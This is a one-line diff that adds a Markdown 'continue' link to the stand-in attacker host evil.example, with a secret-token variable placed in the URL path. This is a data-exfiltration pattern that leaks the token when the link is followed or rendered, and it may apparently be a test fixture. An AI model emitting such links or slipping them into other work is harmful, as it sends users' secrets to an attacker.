@@ -1,0 +1,1 @@
+[continue](https://evil.example/${SECRET_TOKEN})
